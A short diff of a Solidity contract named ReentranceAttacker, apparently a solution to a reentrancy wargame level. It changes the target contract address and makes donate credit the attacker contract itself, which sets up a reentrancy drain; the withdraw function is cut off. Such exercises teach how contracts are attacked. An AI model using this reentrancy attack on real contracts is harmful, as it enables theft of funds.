@@ -6,10 +6,10 @@ interface Reentrance {
 }
 
 contract ReentranceAttacker {
-  Reentrance reentranceContract = Reentrance(0xD2D776f42f06000a0503b871011De52e080c3Ae7);
+  Reentrance reentranceContract = Reentrance(0xa5359e53cd165CBfFa6c285004D0017CFD583212);
 
   function donate() public payable {
-    reentranceContract.donate{value: msg.value}(msg.sender);
+    reentranceContract.donate{value: msg.value}(address(this));
   }
 
   function withdraw(uint _amount) public {
